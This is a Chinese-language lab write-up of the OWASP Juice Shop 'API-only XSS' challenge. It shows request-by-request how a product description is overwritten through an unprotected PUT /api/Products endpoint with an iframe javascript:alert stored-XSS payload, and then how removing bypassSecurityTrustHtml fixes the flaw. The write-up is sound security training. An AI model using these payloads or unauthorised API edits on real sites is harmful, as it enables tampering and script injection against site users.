- API-only XSS
    - 描述：在不使用任何前端应用程序的情况下，使用 
        ```html
        <iframe src="javascript:alert(`xss`)">
        ``` 
        执行持久化的XSS攻击。
    - 尝试对商品评论进行注入，被恰当的作为文本字符处理
    - 看到商品描述中除文字外还有链接，即 HTML 元素
        - 请求
            ```GET /rest/products/search?q= HTTP/1.1```
        - 截取响应
            ```json
            {
                "id": 24,
                "name": "Apple Pomace",
                "description": "Finest pressings of apples. Allergy disclaimer: Might contain traces of worms. Can be <a href=\"/#recycle\">sent back to us</a> for recycling.",
                "price": 0.89,
                "deluxePrice": 0.89,
                "image": "apple_pressings.jpg",
                "createdAt": "2025-12-12 08:41:23.582 +00:00",
                "updatedAt": "2025-12-12 08:41:23.582 +00:00",
                "deletedAt": null
            }
            ```
        - 省略查询参数则返回所有数据
        - 添加查询参数则返回 ```name``` 或 ```description``` 对应数据
        - 在 main.js 中找到对应代码
            ```javascript
            Ft = (() => {
                class n {
                    http = (0, i.WQX)(w.Qq);
                    hostServer = x.c.hostServer;
                    host = this.hostServer + "/api/Products";
                    search(e) {
                        return this.http.get(`${this.hostServer}/rest/products/search?q=${e}`).pipe((0, b.T)(o => o.data), (0, g.W)(o => {
                            throw o
                        }))
                    }
                    find(e) {
                        return this.http.get(this.host + "/", {
                            params: e
                        }).pipe((0, b.T)(o => o.data), (0, g.W)(o => {
                            throw o
                        }))
                    }
                    get(e) {
                        return this.http.get(`${this.host}/${e}?d=${encodeURIComponent((new Date).toDateString())}`).pipe((0, b.T)(o => o.data), (0, g.W)(o => {
                            throw o
                        }))
                    }
                    put(e, o) {
                        return this.http.put(`${this.host}/${e}`, o).pipe((0, b.T)(a => a.data), (0, g.W)(a => {
                            throw a
                        }))
                    }
                    static \u0275fac = function(o) {
                        return new(o || n)
                    };
                    static \u0275prov = i.jDH({
                        token: n,
                        factory: n.\u0275fac,
                        providedIn: "root"
                    })
                }
                return n
            })();
            ```
            - 按照路径设置```find(e) { return this.http.get(this.host + "/"``` 
                请求```GET /api/Products HTTP/1.1```得到与之前相同的全部商品内容
            - 其中 ```put``` 函数似乎可添加或更新商品
                格式为 ```PUT /api/Products/x```
                请求 ```PUT /api/Products/1 HTTP/1.1```
                请求体复制商品信息的 JSON
                响应为 ```id``` 为1的商品信息，但无法更新
            - 查看示例解决方案
            - 之前使用 PUT 方法时应当修改请求的内容类型为 JSON
                ```Content-Type: application/json```
                修改后 PUT 方法可更新商品信息
                - 可修改的字段为
                    ```json
                    {
                        "name":"aaaaaaa",
                        "description":"aaaaaaaaaaa",
                        "price":99.99,
                        "deluxePrice":99.99,
                        "image":"apple_juice.jpg"
                    }
                    ```
                - 修改可显示 HTML 标记的描述字段
                    ```json
                    "description":"<iframe src=\"javascript:alert(`xss`)\">"
                    ```
                - 刷新页面后查看对应商品时即触发保存型 XSS
                - 此处若使用
                    ```html
                    <iframe src=javascript:alert`xss`>
                    ```
                    虽然可触发 XSS 但无法通过挑战，靶场限制
            - 使用 POST 方法的格式为 ```POST /api/Products/```
                输入对应数据即可创建商品，或无数据创建一个默认值的商品

- 代码挑战
    ```typescript
    ngAfterViewInit () {
	    const products = this.productService.search('')
	    const quantities = this.quantityService.getAll()
	    forkJoin([quantities, products]).subscribe({
	      next: ([quantities, products]) => {
	        const dataTable: TableEntry[] = []
	        this.tableData = products
	        this.trustProductDescription(products)
	        for (const product of products) {
	          dataTable.push({
	            name: product.name,
	            price: product.price,
	            deluxePrice: product.deluxePrice,
	            id: product.id,
	            image: product.image,
	            description: product.description
	          })
	        }
	        for (const quantity of quantities) {
	          const entry = dataTable.find((dataTableEntry) => {
	            return dataTableEntry.id === quantity.ProductId
	          })
	          if (entry === undefined) {
	            continue
	          }
	          entry.quantity = quantity.quantity
	        }
	        this.dataSource = new MatTableDataSource<TableEntry>(dataTable)
	        for (let i = 1; i <= Math.ceil(this.dataSource.data.length / 12); i++) {
	          this.pageSizeOptions.push(i * 12)
	        }
	        this.paginator.pageSizeOptions = this.pageSizeOptions
	        this.dataSource.paginator = this.paginator
	        this.gridDataSource = this.dataSource.connect()
	        this.resultsLength = this.dataSource.data.length
	        this.filterTable()
	        this.routerSubscription = this.router.events.subscribe(() => {
	          this.filterTable()
	        })
	        if (window.innerWidth < 2600) {
	          this.breakpoint = 4
	          if (window.innerWidth < 1740) {
	            this.breakpoint = 3
	            if (window.innerWidth < 1280) {
	              this.breakpoint = 2
	              if (window.innerWidth < 850) {
	                this.breakpoint = 1
	              }
	            }
	          }
	        } else {
	          this.breakpoint = 6
	        }
	        this.cdRef.detectChanges()
	      },
	      error: (err) => { console.log(err) }
	    })
	  }
	 
	  trustProductDescription (tableData: any[]) {
	    for (let i = 0; i < tableData.length; i++) {
	      tableData[i].description = this.sanitizer.bypassSecurityTrustHtml(tableData[i].description)
	    }
	  }
    ```
    - 看到了熟悉的函数，正是导致描述可显示 HTML 标签的代码
        ```typescript
        trustProductDescription (tableData: any[]) {
            for (let i = 0; i < tableData.length; i++) {
            tableData[i].description = this.sanitizer.bypassSecurityTrustHtml(tableData[i].description)
            }
        }
        ```
    - 修复：移除绕过安全检查的函数
        > 完全移除绕过消毒的方法是修复此处XSS漏洞的最佳方式。需要注意的是，在这种情况下，XSS只是一个后果，因为用户从一开始就不应该被允许更改产品描述。